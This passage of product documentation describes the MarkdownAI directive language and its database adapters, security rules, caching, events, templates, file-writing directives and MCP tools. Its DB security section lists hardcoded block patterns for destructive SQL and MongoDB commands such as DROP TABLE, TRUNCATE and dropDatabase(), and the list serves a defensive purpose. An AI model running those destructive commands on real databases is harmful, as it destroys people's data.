The adapters support all four structured operations: `find` (SELECT with filters and sorting), `one` (single-row LIMIT 1 lookup), `count` (COUNT(*)), and `aggregate` (GROUP BY with functions). All filter values are bound as query parameters - never concatenated - making SQL injection structurally impossible through directive input.

Engine-specific differences: SQLite has no native boolean type, so `true` and `false` become `1` and `0`. MSSQL uses `TOP N` instead of `LIMIT N`. Date values from any adapter are normalized to ISO strings before returning, so your document always gets consistent date formatting regardless of how the database stores them.

#### Examples

Query with filters, sort, and column selection:
```markdown
@db using="primary" find="users" where="active==true && role==admin" sort="name:asc" limit=10 columns="name:Name,email:Email"
```

This generates (PostgreSQL):
```sql
SELECT name AS "Name", email AS "Email"
FROM users
WHERE active = $1 AND role = $2
ORDER BY name ASC
LIMIT 10
-- parameters: [true, "admin"]
```

<!-- /mdd-section: 71-db-sql-adapters -->

<!-- mdd-section: 72-db-security -->
### DB - Security System

The DB security system controls what each database connection can do when an `@db` directive runs. It combines per-connection rules you configure with a fixed set of hardcoded block patterns that cannot be disabled under any circumstances.

#### What It Does

Security operates in two layers. The first layer is configurable - you define per-connection limits in `~/.markdownai/security.json`, restricting which operations and collections a connection can touch. The second layer is a fixed list of destructive SQL and MongoDB patterns that are always blocked. If a query matches a blocked pattern, the engine raises a `SECURITY_ALERT` and halts the entire document - this is not a warning that can be silenced.

The immutable SQL block list covers: `DROP TABLE`, `TRUNCATE`, `DELETE FROM`, `UPDATE ... SET`, `ALTER TABLE`, `CREATE USER`, `GRANT`, `REVOKE`. The MongoDB block list covers: `dropDatabase()`, `deleteMany()`, `updateMany()`, `remove()`, `insertMany()`, and any `db.admin()` command.

#### Configuration

Add a `db` key to `~/.markdownai/security.json`. Each entry matches a named connection:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `allowed_operations` | string[] | all | If non-empty, only these operations are permitted |
| `denied_operations` | string[] | none | Always blocked for this connection |
| `allowed_collections` | string[] | all | If non-empty, only these tables/collections may be queried |
| `denied_collections` | string[] | none | Always blocked; takes precedence over `allowed_collections` |
| `allow_raw` | boolean | false | Whether `raw=` queries are permitted on this connection |
| `max_results` | number | 1000 | Hard cap on rows; excess is silently truncated with a WARN |

#### Examples

Read-only connection limited to two collections:
```json
{
  "db": {
    "primary": {
      "allowed_operations": ["find", "one", "count"],
      "allowed_collections": ["users", "orders"],
      "allow_raw": false,
      "max_results": 500
    }
  }
}
```

<!-- /mdd-section: 72-db-security -->

<!-- mdd-section: 73-db-caching -->
### DB - Caching Integration

The `@cache` modifier lets you control how `@db` query results are stored and reused across renders. In AI sessions it acts as a correctness guarantee - not just a speed boost.

#### What It Does

When a document renders in multiple phases (as happens in AI sessions), a live database query can return different rows each time. That inconsistency corrupts the context the AI sees. Adding `@cache session` to a `@db` directive locks in a single result for the entire session, so every phase reads identical data. Other cache modes let you persist results across sessions, expire them after a set time, or swap in a local JSON fixture for offline development.

All cache modes from the caching system apply to `@db`: `session`, `persist`, `ttl=N`, and `mock=./file.json`. The `@cache` token always appears as the last option before the pipe.

#### How To Use It

Add `@cache` and a mode directly after your `@db` options on the same line:

- `session` - same result for the entire current session (recommended for AI documents)
- `persist` - result survives across sessions until manually cleared
- `ttl=N` - result expires after N seconds
- `mock=./file.json` - serve a local JSON file instead of hitting the database

For offline development, seed a fixture file from production once, then use `persist` or `mock=` to work without a live connection.

#### Examples

Lock query results for an AI session:
```markdown
@db using="primary" find="users" where="active==true" @cache session | @render type="table"
```

Seed a fixture from production, then work offline:
```bash
mai cache seed input.md --env .env.production --directive db
mai watch input.md
```

<!-- /mdd-section: 73-db-caching -->

<!-- mdd-section: 74-db-error-handling -->
### DB - Error Handling

Errors in `@db` directives fall into three categories with different severities. Most runtime problems produce empty output and let the document continue - only configuration mistakes and security violations stop rendering immediately.

#### What It Does

Parse errors (bad options, missing required fields, conflicting operations) are always fatal. The document halts immediately and prints the file path, line number, what was found, and a hint for how to fix it. Runtime errors like a dropped connection or a timeout produce empty output by default and let the rest of the document render - pass `--strict` to make these fatal. Soft conditions like zero rows or hitting the `max_results` cap never produce errors; they return empty or truncated output and carry on.

| Condition | Severity | Document behavior |
|-----------|----------|-------------------|
| Invalid options / conflicting operations | FATAL | Document halts |
| Connection failure / query timeout | ERROR (default) / FATAL (`--strict`) | Empty output, continues |
| Zero rows returned | none | Empty string, no log entry |
| max_results hit | WARN | Result truncated, continues |
| raw= without allow_raw | WARN | Directive stripped, continues |
| Immutable block pattern match | SECURITY_ALERT | Document halts |

Note: `--silent` never suppresses SECURITY_ALERT or FATAL messages.

<!-- /mdd-section: 74-db-error-handling -->

<!-- mdd-section: 75-engine-bug-fixes -->
### Engine Bug Fixes

Four bugs in the engine execution layer have been resolved, covering shell command execution, macro behavior, conditional evaluation, and import error handling.

#### What It Does

Shell commands via `@query` now execute correctly. Previously, `mai security shell enable` saved your settings but the render path never read them, so shell commands silently returned empty output. That is fixed - your security config is loaded before any execution happens. As a side effect, `@query` inside `@define` and `@call` macros also works correctly now. Two smaller fixes: `@if` conditions that reference an undefined label no longer emit a confusing warning - they evaluate quietly to false. And an absolute path in `@import` no longer crashes the entire render - it emits a warning and skips that import instead.

<!-- /mdd-section: 75-engine-bug-fixes -->

<!-- mdd-section: 76-packages-readmes -->
### Package README Files - All npm Packages

All five `@markdownai` npm packages now have complete README files. Developers landing on any individual package page get full documentation without needing to visit the main repo.

#### What It Does

Each package README covers what the package does, how to install it, and full usage documentation for every exported API or command. Security notes are included where relevant. A compact nav at the top of each README links to all other packages in the family. The packages covered are `@markdownai/parser`, `@markdownai/renderer`, `@markdownai/engine`, `@markdownai/mcp`, and `@markdownai/core`.

<!-- /mdd-section: 76-packages-readmes -->

<!-- mdd-section: 77-claude-native -->
### Claude-Native Adoption

When you install `@markdownai/core`, Claude learns what MarkdownAI is and why it is worth using. This removes the gap between installing the package and having Claude reach for MarkdownAI syntax when writing new markdown files.

#### What It Does

The feature hooks into the package install and uninstall lifecycle to keep your Claude configuration in sync. On install, it offers to add a MarkdownAI education section to your global Claude config. On uninstall, it removes that section cleanly, leaving the rest of your config untouched. The education section explains the format to Claude in concrete terms so it prefers MarkdownAI naturally - goal is informed preference, not enforcement.

#### How To Use It

1. Install the package: `npm install -g @markdownai/core`
2. If your terminal is interactive, you will be asked whether to add MarkdownAI instructions to your Claude config. Press `y` to confirm.
3. If you skipped during install or ran a non-interactive install, run `mai init --global-claude-md` at any time to add the section manually.
4. When you uninstall the package, the section is stripped from your Claude config automatically.

#### Examples

Interactive install prompt:
```
Add MarkdownAI instructions to ~/.claude/CLAUDE.md? (y/N) y
Added MarkdownAI section to ~/.claude/CLAUDE.md
```

Manual add via CLI:
```bash
mai init --global-claude-md
```

<!-- /mdd-section: 77-claude-native -->

<!-- mdd-section: 78-lang-note -->
### @note Directive

`@note` lets you leave source-level explanations inside a MarkdownAI document for anyone reading the raw file. By default the block disappears entirely from rendered output.

#### What It Does

A plain `@note` block is invisible in all rendered output - it exists to explain what a nearby directive or section does when someone opens the raw file. Adding the `visible` flag turns the block into a rendered blockquote callout. The optional `consumer` argument scopes a visible note to render only for human readers or only for AI consumers via MCP. `@note` is the human-facing counterpart to `@prompt` - where `@prompt` carries instructions aimed at AI readers, `@note` carries explanations for humans reading the source.

`mai strip` always removes `@note` blocks regardless of the `visible` flag.

#### How To Use It

```markdown
@note
Source-only comment - never appears in output.
@end

@note visible
Renders as a blockquote callout for all readers.
@end

@note visible consumer="human"
Renders only for human readers.
@end

@note visible consumer="ai"
Renders only for AI consumers (MCP).
@end
```

#### Examples

Source-only explanation for a complex directive:
```markdown
@note
This @db directive pulls from the staging replica.
Switch the alias to "prod" before the next release.
@end
```

Visible callout in output:
```markdown
@note visible
This section updates nightly. Refresh before sharing.
@end
```
Renders as:
> **Note:**
> This section updates nightly. Refresh before sharing.

<!-- /mdd-section: 78-lang-note -->

<!-- mdd-section: 00-frontmatter-spec -->
### MDD Frontmatter Schema Reference

Every feature doc in `.mdd/docs/` opens with a YAML frontmatter block. This block is machine-read by the MDD workflow, so field names and values must be exact.

**Identity fields**

- `id` - matches the filename slug exactly (e.g. `03-auth-tokens`)
- `title` - human-readable feature name
- `path` - slash-delimited breadcrumb showing where this feature sits in the project hierarchy
- `edition` - `MDD` or `Both`
- `status` - one of `draft`, `in_progress`, `complete`, or `deprecated`
- `phase` - build phase this doc belongs to
- `mdd_version` - integer, increments when the doc structure changes
- `last_synced` - ISO date when doc was last verified against actual code

**Dependency fields**

- `depends_on` - list of doc IDs that must be built before this one
- `relates` - list of doc IDs that tend to change at the same time as this one (not hard dependencies, but good to review together)

**Code location fields**

- `source_files` - source files this doc describes
- `test_files` - test files that cover this feature
- `routes` - API routes owned by this feature
- `models` - database models owned by this feature

**Behavior fields**

- `data_flow` - one of `greenfield`, `reads-existing`, `writes-existing`, or `mixed`
- `tags` - domain concepts and technology names; used for cross-referencing
- `integration_contracts` - contracts this feature consumes from other features
- `satisfies_contracts` - contracts this feature publishes for others to consume

**Safety fields**

- `security_read_sites` - code locations where security-sensitive reads happen; keep this current so audits know where to look
- `known_issues` - append-only list of known bugs or gaps; never delete entries, only add new ones

All fields are required unless the value genuinely does not apply, in which case use an empty list `[]`. Omitting a field entirely will cause workflow validation to fail.

<!-- /mdd-section: 00-frontmatter-spec -->

<!-- mdd-section: 79-vscode-preview -->
### VS Code Extension - Live Preview

The live preview panel renders your MarkdownAI document inside VS Code using the built-in Markdown preview, so you can see exactly what `mai render` produces without switching to a terminal.

**Opening the preview**

With a MarkdownAI file open and focused, open the preview using any of these:

- Click the preview icon in the editor title bar (top-right of the tab)
- Right-click the editor tab and select "Open MarkdownAI Preview"
- Right-click inside the editor and select "Open MarkdownAI Preview"

The preview opens to the side - it does not replace the source editor. These options only appear on files detected as MarkdownAI documents (files that open with `@markdownai`).

**What it shows**

The preview runs `mai render` on your file and displays the output. This includes all resolved directives - `@env` values are pulled from your environment, `@http` responses are fetched live, `@include` files are inlined. What you see in the panel is what `mai render` would print to the terminal.

If a directive fails or the render exits with an error, the preview shows a formatted error message rather than going blank.

**Auto-refresh**

The preview updates automatically each time you save the file. You do not need to close and reopen it. The refresh triggers only on MarkdownAI files, so preview panels on other file types are unaffected.

**Render timeout**

Each preview render has a 15-second timeout. If your document fetches from a slow external source - a database query, a slow API - and it does not complete within that window, the preview stops waiting and shows a timeout error. The source file is untouched; just save again once the connection is available.

**Note:** The preview does not cache output. Every save triggers a fresh render from scratch.

<!-- /mdd-section: 79-vscode-preview -->

<!-- mdd-section: 80-run-state-tests -->
### Run-State Tests - Pre-Publish Verification

Before any package in the MarkdownAI monorepo can be published to npm, it must pass a run-state test. These tests verify that each package actually works from its built `dist/` artifacts - the same files a consumer gets when they `npm install` the package. They catch the class of bugs that only appear after a build: broken relative paths, missing export declarations, and binary entry points that resolve correctly in `src/` but fail on a real install.

**What gets tested**

A single test file, `e2e/run-state.test.ts`, covers all five publishable packages. Each package has its own `describe` block that checks four things:

1. The package's main export resolves and returns the expected type
2. A primary function can be called with minimal valid input without throwing
3. For packages with a CLI binary, the binary exits `0` on `--version` and `--help`
4. At least one real-world operation completes successfully end to end

The five packages and their key checks:

| Package | Core check |
|---|---|
| `@markdownai/parser` | `parse('@markdownai v1.0\n\nHello world')` returns a nodes array |
| `@markdownai/renderer` | `render(ast, 'markdown')` returns a non-empty string |
| `@markdownai/engine` | `execute(...)` output contains expected content |
| `@markdownai/mcp` | `startServer` is a function; `mai-serve` responds to JSON-RPC `tools/list` |
| `@markdownai/core` | `mai --version` exits `0` with a semver; `mai --help` contains `render`, `strip`, `validate` |

Tests import only from `dist/` - never from `src/`. If the build is broken or incomplete, the tests fail.

**The all-or-nothing publish guard**

This is the part that matters most. Every publishable package has this in its `package.json`:

```json
"prepublishOnly": "npm --prefix ../.. run test:run-state"
```

That script runs the full suite across all five packages. If any one of them fails, `npm publish` is blocked for the package you tried to publish. You cannot publish `@markdownai/renderer` with a broken `@markdownai/parser`. All five must pass before any single package can go out.

The root `package.json` exposes the suite directly:

```bash
npm run test:run-state
```

Run this any time you want to verify the full publish readiness of the workspace without actually publishing.

**What is excluded**

The VS Code extension (`markdownai`) requires the VS Code runtime and cannot be tested this way. The `@markdownai/markdownai` meta-package is also excluded - it has no runtime behavior to verify, only peer dependencies to declare.

<!-- /mdd-section: 80-run-state-tests -->

<!-- mdd-section: 81-lang-event -->
### Language - @event Directive

The `@event` directive fires a named signal at a specific point during document rendering. When the engine hits an `@event` line, it dispatches the event to one or more transports - output channels that do something with the signal. The document keeps rendering immediately; events are fire-and-forget.

Use `@event` when you want to push a value somewhere at a specific point in a document: report progress during a long render, log a status change, notify VS Code's status bar, or feed structured data to a WebSocket listener.

**All transports are disabled by default.** A document with `@event` directives and no config produces no side effects - the directives are silently no-ops until you explicitly allow transports in `.markdownai.json`.

#### Syntax

```
@event name='<event-name>' data='<string-or-json>' transport='<transport>'
@event name='<event-name>' data='<string-or-json>' transport='<transport>' visible
```

Parameters:

- **`name`** (required) - the event name, e.g. `phase-complete`, `progress`, `status`
- **`data`** (required) - a plain string or a JSON object string
- **`transport`** (optional) - comma-separated list of transport names; defaults to `log` if omitted
- **`visible`** (optional flag) - when present, the event renders as a blockquote in the output document; without it, the directive produces no visible output

#### Enabling Transports

Add an `allowed_transports` list to your `.markdownai.json`. Only transports in this list will fire:

```json
{
  "allowed_transports": ["log", "vscode"]
}
```

Any transport not in the list is silently skipped, even if a document references it.

#### Built-in Transports

**`log`** - writes a structured line to stderr. Good for debugging and CLI pipelines. The default when no transport is specified.

```
@event name='step-done' data='config loaded' transport='log'
```

**`mcp`** - accumulates the event in `ctx.events[]`, which gets returned in the MCP tool response. Use this when documents run inside an MCP tool call and the caller needs to collect events as structured output.

```
@event name='progress' data='{"step": 1, "total": 4}' transport='mcp'
```

**`vscode`** - writes to a session-specific JSON file that the VS Code extension polls. This drives status bar updates while a document is rendering. Combine with `log` if you also want stderr output:

```
@event name='progress' data='{"step": 2, "total": 5, "label": "Loading config"}' transport='vscode,log'
```

**`websocket`** - pushes JSON to all connected WebSocket clients. Use for live dashboards or any UI that listens for render progress.

**`file`** - appends the event as a JSON line to a configured file path.

**`http`** - POSTs the event as JSON to a configured URL. The target domain must be in the security allowlist.

**`db`** - inserts the event into a configured collection. Requires security config.

#### Multiple Transports

Separate transport names with commas - all listed transports fire simultaneously:

```
@event name='build-status' data='{"status": "running"}' transport='mcp,websocket'
```

#### Visible Events

Without `visible`, `@event` is a pure side effect - nothing appears in the rendered document. Add `visible` to render the event as a blockquote at that position:

```
@event name='phase-done' data='setup complete' transport='log' visible
```

This is useful when you want the document itself to show a status marker alongside dispatching the signal.

#### Security

- **Transport allowlist** - only transports listed in `allowed_transports` fire; everything else is a no-op
- **No expression evaluation in data** - `{{ expressions }}` inside `data` are not evaluated by default (`allow_env_interpolation: false`)
- **Automatic masking** - `applyMasking()` runs on every data string before dispatch, unconditionally, regardless of config
- **Data cap** - data strings are capped at 500 characters after masking; this limit cannot be raised

Custom transports can be registered in `.markdownai.json` with type `http`, `file`, or `db`. They follow the same security rules as built-in transports.

<!-- /mdd-section: 81-lang-event -->

<!-- mdd-section: 82-engine-directive-tracing -->
### Engine - Directive Execution Tracing (dev tooling)

**This is internal dev tooling. Document authors cannot enable or use it.**

Set `MARKDOWNAI_TRACE` to enable structured trace output for every directive the engine executes. Each span records the directive type, timing, arguments (masked), output size, and any error. Spans are paired - every start has a matching end or error span.

**Sink options:**

| Value | Behavior |
|---|---|
| `true`, `1`, or `stderr` | Writes JSON-Lines to stderr, synchronously |
| `file:/path/to/trace.jsonl` | Appends to file, async (fire-and-forget) |
| `http://host/trace` | POSTs to endpoint, async (fire-and-forget) |

File and HTTP sinks never block rendering. Stderr is synchronous, so trace output appears in execution order - useful for debugging sequencing issues.

**What each span contains:** a unique span ID, run ID, directive type, status (`start`/`end`/`error`), timestamps, duration, document path, source line, current phase, call stack depth, masked args, output size, error details, git hash, and session ID.

All 24 directive types are traced. Args are always run through `applyMasking()` regardless of transport - sensitive values do not appear in trace output even though this path bypasses the normal user security gates.

Off by default. No directive exists to turn it on from inside a document.

<!-- /mdd-section: 82-engine-directive-tracing -->

<!-- mdd-section: 83-lang-foreach-set -->
### @foreach and @set - Iteration and Variable Assignment

These two directives let you work with lists and variables directly inside your documents. `@foreach` repeats a block of content once for each item in a list. `@set` stores a value under a name so you can use it anywhere in the document without rewriting it.

#### What It Does

`@foreach` takes a list of items and runs the same block of text once for each one, substituting the current item wherever you put the variable placeholder. The list can come from a folder of files, a comma-separated string you write inline, or the output of another directive. After the loop finishes, everything returns to its previous state - nothing leaks out.

`@set` saves a value to a name you choose. Once set, you can drop `{{ name }}` anywhere in the document and the actual value will appear when the document renders. This is useful for version numbers, titles, or any value you want to write once and reuse many times.

#### How To Use It

For `@foreach`, write the directive on its own line followed by your content block, then close it with `@end`. The word between `in` and your source is the variable name you choose - it will hold the current item during each pass through the loop.

For `@set`, write the directive on its own line with the variable name, an equals sign, and the value or source. After that line, use `{{ yourVariableName }}` anywhere below it in the document to insert the stored value.

#### Examples

Repeat a line for each file found in a folder:

```
@foreach item in @list path="./items"
  - {{ item }}
@end
```

Loop over a short list written directly in the document:

```
@foreach name in "Alice,Bob,Carol"
  Hello {{ name }}!
@end
```

Store a document title and a version number, then use them later:

```
@set title = "Release Notes"
@set version = {{ package.version }}

# {{ title }} - v{{ version }}

This document covers everything new in version {{ version }}.
```

<!-- /mdd-section: 83-lang-foreach-set -->

<!-- mdd-section: 84-lang-frontmatter-ops -->
### @read-frontmatter and @update-frontmatter - Frontmatter Access

These two directives let you read and write the YAML frontmatter fields of any markdown file in your project. Use them to surface live metadata - like a document's status or tags - directly inside another document, or to keep frontmatter fields up to date automatically as your workflow progresses.

#### What It Does

`@read-frontmatter` pulls a single field from a file's frontmatter block and places its value at the directive's position in the document. If the field holds a list, the values appear joined by commas. If the field does not exist in the target file, the directive returns an empty string rather than an error. You can also capture the value into a named variable using `label=`, which lets you reference it later in the document as `{{ variableName }}`.

`@update-frontmatter` writes a new value to a frontmatter field in a file on disk. The change is made in place, so the rest of the file stays exactly as it was. If the field already holds the value you are writing, nothing changes - the operation is safe to run more than once. Only scalar fields (plain strings, numbers, booleans) can be written; list fields are read-only.

#### How To Use It

To read a field and display it inline, provide the file path and the field name:

```
@read-frontmatter path="path/to/file.md" field="fieldName"
```

To capture the value into a variable for use later in the same document, add a label:

```
@read-frontmatter path="path/to/file.md" field="fieldName" label=myVar
```

Then reference it anywhere below with `{{ myVar }}`.

To write a value back to a file's frontmatter, provide the path, field name, and the new value:

```
@update-frontmatter path="path/to/file.md" field="fieldName" value="newValue"
```

All paths must stay within your document root. Paths that attempt to navigate outside it are blocked by the engine.

#### Examples

Display a document's current status inline:

```
Parser status: @read-frontmatter path=".mdd/docs/01-parser.md" field="status"
```

Renders as something like: `Parser status: in-progress`

Capture tags from another doc and use them later:

```
@read-frontmatter path=".mdd/docs/01-parser.md" field="tags" label=parserTags

Related tags: {{ parserTags }}
```

Mark a feature doc as complete when a phase finishes:

```
@update-frontmatter path=".mdd/docs/01-parser.md" field="status" value="complete"
```

<!-- /mdd-section: 84-lang-frontmatter-ops -->

<!-- mdd-section: 85-lang-render-template -->
### @render-template - Document Scaffolding

`@render-template` takes a template file, fills in the values you provide, and writes the finished document to a new file. Use it to create feature docs, config files, READMEs, or any file that follows a repeatable structure.

#### What It Does

When you run `@render-template`, MarkdownAI reads the template you point it at, replaces every `{{ key }}` placeholder with the matching value from the directive body, and saves the result to the destination you specify. The output goes to its own file - nothing is inserted into your current document. By default the directive skips the write if the destination already exists, so running a document twice will not overwrite work you have already done.

#### How To Use It

Write the directive with a `from` path (the template) and a `to` path (where the output should land). Add one `key=value` line per placeholder you want to fill. Close the block with `@end`.

```
@render-template from="<template-file>" to="<output-file>"
  key1=value1
  key2=value2
@end
```

Add `force` after the `to` path to overwrite an existing file. Add `if-missing` to make the skip-if-exists behaviour explicit.

#### Configuration

| Option | Type | Default | Description |
|---|---|---|---|
| `from` | string | required | Path to the template file containing `{{ key }}` placeholders |
| `to` | string | required | Path where the rendered output file will be written |
| `force` | flag | off | Overwrite the destination file even if it already exists |
| `if-missing` | flag | on | Skip the write if the destination already exists (default behaviour) |

#### Examples

Scaffold a new feature doc from a standard template:

```
@render-template from="templates/feature-doc.md" to=".mdd/docs/04-search.md"
  id=04-search
  title=Search
  status=draft
@end
```

Regenerate a config file on every run:

```
@render-template from="templates/app-config.json" to="config.json" force
  env=production
  port=3000
@end
```

<!-- /mdd-section: 85-lang-render-template -->

<!-- mdd-section: 99-lang-template-data -->
### @template and @data - Reusable Partials with Bound Data

`@template` inlines another MarkdownAI document at the call site and binds it to a data context, like a partial in Angular or Vue. `@data` composes a single object from many in-scope values so the same composite can feed multiple template renders. Together they let you reuse the same rendered fragment for a list of database rows, a paginated response, or any other collection - including from inside an `@foreach` - while keeping every existing file-resolution, security, and scope rule intact.

#### What They Do

`@template ./partial.md data=<expression> /` reads the partial, parses it as a full MarkdownAI document (every directive that works in a top-level document works inside the partial), and renders it inline. The expression you pass with `data=` is evaluated against the caller's current scope and bound to `{{ data.* }}` inside the partial. Use `as=<name>` to expose the binding under a different name (handy when partials are nested and the inner one also wants `data` for its own caller).

`@data <name>` opens a block whose body is a list of `<key> = <expression>` assignments and `...<expression>` spreads. Each entry is evaluated through the same engine that powers `@set` and `@foreach`, so any directive call, interpolation, or literal that works there works here. The composed object is stored under `<name>` in the same scope as `@set` variables, ready to be passed to one or many template calls.

Inside the partial, reads inherit from the caller (your `@set` values, `@db` results, `@connect` connections, macros, env fallbacks). Writes are sandboxed: any `@define`, `@connect`, `@set`, or `@env` declared inside the partial stays local to that render. This is the deliberate difference from `@include` - it means you can call the same partial repeatedly inside an `@foreach` without name collisions piling up.

#### How To Use Them

Place `@data` near the top of your document and list the fields you want bundled. Dot-notation keys build nested objects (`site.name = "Acme"` and `site.theme = "dark"` produce `{ site: { name: 'Acme', theme: 'dark' } }`). Spread lines (`...other`) deep-merge another object into the composite at that point. Later entries override earlier ones, so a default block plus a single overriding line is a clean variant pattern.

To render a partial, drop `@template <path> data=<expression> /` on its own line. The trailing ` /` is required because `@template` is a single-line directive in the v2 syntax. Path rules match `@include`: relative only, no absolute paths, no `..` traversal.

To render the same partial once per item in a collection, wrap the call in an `@foreach` block. The loop variable is in scope when the engine evaluates the `data=` expression, so `data=row` binds each iteration's row to `{{ data }}` inside the partial.

#### Configuration

| Option | Type | Default | Description |
|---|---|---|---|
| `@template` path | string | required | Relative path to the partial (same rules as `@include`) |
| `data=` | expression | none | Expression evaluated in caller scope and bound to `{{ data.* }}` inside the partial |
| `as=` | identifier | `data` | Local name for the binding inside the partial (e.g. `as=row` exposes it as `{{ row.* }}`) |
| `if` | expression | none | Conditional render - the call produces no output when the expression is false |

| `@data` body | Shape | Description |
|---|---|---|
| `<key> = <expression>` | assignment | Adds the evaluated expression to the composite under the given key. Dot-notation builds nested objects. |
| `...<expression>` | spread | Evaluates an expression to an object, deep-clones it, and deep-merges into the composite. Non-object values WARN and skip. |
| `# <text>` | comment | Ignored. |

#### Examples

A single partial rendered with a composed data object:

```
@db users from=mainDb query="SELECT * FROM users" label=users /
@set siteName = "Acme" /

@data myReport
  users = users
  site.name = siteName
  site.theme = "dark"
@data-end

@template ./summary.md data=myReport /
```

Inside `summary.md`:

```
@markdownai v1.0
# {{ data.site.name }}

Theme: {{ data.site.theme }}
Total users: {{ data.users }}
```

One partial per row inside a loop, with a sibling caller value visible inside each render:

```
@markdownai v1.0
@db users from=mainDb query="SELECT id, name FROM users" label=users /
@set siteName = "Acme" /

@foreach row in {{ users }}
  @template ./user-card.md data=row /
@foreach-end
```

Inside `user-card.md`:

```
@markdownai v1.0
- **{{ data.name }}** at {{ siteName }} (id={{ data.id }})
```

A default config block plus a variant via spread:

```
@data baseConfig
  site.name = "Acme"
  site.theme = "light"
  features.search = true
@data-end

@data emailVariant
  ...baseConfig
  site.theme = "dark"
  features.compactLayout = true
@data-end

@template ./web.md data=baseConfig /
@template ./email.md data=emailVariant /
```

Renaming the binding so a nested partial can call another partial without shadowing:

```
@template ./section.md data=row as=section /
```

Inside `section.md` you reference `{{ section.title }}`, freeing `data` for any inner `@template ./inner.md data=row.detail /` to use.

<!-- /mdd-section: 99-lang-template-data -->

<!-- mdd-section: 86-lang-test-check -->
### @test and @check - Code Quality Directives

`@test` and `@check` run your project's quality checks and embed the results directly in the document. Drop either directive into any `.md` file and the output appears inline every time the document renders.

#### What It Does

`@test` runs your test suite and shows a summary of what passed and failed. It reads `package.json` to find the test command automatically, and it understands the output formats of vitest, jest, playwright, and node:test well enough to produce a clean summary rather than raw terminal noise.

`@check` runs code quality tools - type checking, linting, formatting, and build validation. It looks for commands in your `package.json` in a fixed order: `typecheck` first, then `check`, then `lint`, then `build`. If none of those exist, it falls back to running `tsc --noEmit` directly. Like `@test`, it embeds the result in the document automatically.

Both directives require shell execution to be enabled for the current working directory in your security config. If it is not enabled, the directive will produce an error rather than silently skipping.

#### How To Use It

Place `@test` or `@check` on its own line anywhere in the document where you want the results to appear. No configuration is required for basic use - both directives find the right command on their own.

To override the auto-detected command, add `command="..."`. To save the result for use elsewhere in the document, add `label=name`. To set a timeout, add `budget=N` where N is seconds.

#### Configuration

| Option | Description |
|--------|-------------|
| `command="..."` | Override the auto-detected command with a custom one |
| `label=name` | Store the result as `{{ name }}` for use elsewhere in the document |
| `budget=N` | Stop execution after N seconds if the command has not finished |

#### Examples

Basic usage - let the directive find the command itself:

```
@test

@check
```

Custom command with a label and timeout:

```
@test command="npm run test:unit" label=unitResults budget=60

@check command="npx tsc --noEmit" label=typeErrors
```

<!-- /mdd-section: 86-lang-test-check -->

<!-- mdd-section: 87-lang-hash -->
### @hash - Content Verification

The `@hash` directive computes a cryptographic hash of a file and writes the result directly into your document. Use it to verify file integrity, fingerprint documents, or embed a checksum alongside the content it describes.

#### What It Does

When MarkdownAI renders your document, `@hash` reads the target file, computes a hash of its contents, and replaces the directive with the hex digest. You can truncate the digest to a short prefix for readability, choose between SHA-256, SHA-1, or MD5, and optionally exclude lines that match a pattern before hashing. The exclude-line option is what makes self-referencing possible: a document can hash itself while skipping the line that holds the hash value, so the result stays stable across renders.

#### How To Use It

Place `@hash` on its own line wherever you want the hash to appear. Provide the file path using the `path` option. All other options are optional.

If you want to reference the hash elsewhere in the same document, add a `label` option. This stores the result as a variable you can call with `{{ labelName }}` anywhere below the directive.

#### Configuration

| Option | Type | Default | Description |
|---|---|---|---|
| `path` | string | required | Path to the file to hash |
| `algo` | `sha256`, `sha1`, `md5` | `sha256` | Hash algorithm to use |
| `length` | number | full digest | Truncate the hex digest to the first N characters |
| `exclude-line` | regex string | none | Skip lines matching this pattern before hashing |
| `label` | string | none | Store the result as `{{ name }}` for reuse |

#### Examples

Basic integrity check - embed the SHA-256 hash of a source file:

```
@hash path="src/core/engine.ts"
```

Short prefix for readable labels:

```
@hash path="src/core/engine.ts" algo=sha1 length=8
```

Self-referencing document hash - the file hashes itself while ignoring the line that holds the result:

```
@hash path=".mdd/docs/01-parser.md" exclude-line="^hash:" label=docHash

hash: {{ docHash }}
```

<!-- /mdd-section: 87-lang-hash -->

<!-- mdd-section: 88-lang-write-directives -->
### Write Directives - @mkdir, @copy, @append-if-missing

These three directives let a MarkdownAI document set up files and folders as part of its own execution. Instead of telling a developer to manually create directories or copy template files, the document does it for them.

#### What It Does

`@mkdir` creates a folder at a path you specify. `@copy` copies a file from one location to another, with an option to skip the copy if the destination already exists. `@append-if-missing` adds a line to a text file only if that line is not already there - useful for keeping config files like `.gitignore` correct without duplicating entries. All three directives are restricted to a configured write root, so they cannot touch files outside the project.

#### How To Use It

**@mkdir** - Creates the directory at the given path. Safe to call multiple times - if the folder already exists, nothing happens.

```
@mkdir path=".mdd/docs"
@mkdir .mdd/audits
@mkdir path="output/reports" recursive=false
```

**@copy** - Copies a file from `from` to `to`. Supports environment variable expansion in the `from` path.

```
@copy from="${CLAUDE_SKILL_DIR}/templates/hook.ts" to="./hooks/post-commit.ts"
@copy from="src/config.example.json" to="src/config.json" if-missing
```

Without `if-missing`, the copy always runs and overwrites the destination. With `if-missing`, the copy is skipped if the destination file already exists.

**@append-if-missing** - Appends a line of text to a file only if that exact text is not already in the file. Creates the file if it does not exist yet.

```
@append-if-missing path=".gitignore" text=".env"
@append-if-missing path=".gitignore" text=".mdd/audits/"
```

#### Examples

Bootstrap a project structure in a single document run:

```
@mkdir .mdd/docs
@mkdir .mdd/audits
@copy from="${CLAUDE_SKILL_DIR}/templates/claude.md" to="./CLAUDE.md" if-missing
@append-if-missing path=".gitignore" text=".env"
@append-if-missing path=".gitignore" text=".mdd/audits/"
```

Scaffold a feature hook idempotently:

```
@mkdir hooks
@copy from="${CLAUDE_SKILL_DIR}/templates/pre-commit.ts" to="./hooks/pre-commit.ts" if-missing
@append-if-missing path=".gitignore" text="hooks/*.local.ts"
```

<!-- /mdd-section: 88-lang-write-directives -->

<!-- mdd-section: 89-mcp-constraints -->
### MCP get_constraints Tool

The `get_constraints` tool reads a MarkdownAI document and returns every `@constraint` directive defined in that file, sorted from most to least severe. Use it to programmatically inspect the rules a document enforces before running any automated process against it.

#### What It Does

When you call `get_constraints`, the MCP server scans the specified document for all `@constraint` directives and groups them by severity level: critical, high, medium, and low. It returns the full sorted list along with two status flags - `isMarkdownAI` confirms whether the file is a valid MarkdownAI document, and `blocked` tells you whether the document's current phase gate is preventing progress. All inputs are validated before the tool runs, so malformed paths or oversized payloads are rejected before any file is read.

#### How To Use It

Call `get_constraints` through any MCP client connected to the `@markdownai/mcp` server. Pass the path to the document you want to inspect as the `filePath` argument. The path should be relative to your project root.

#### API Endpoints

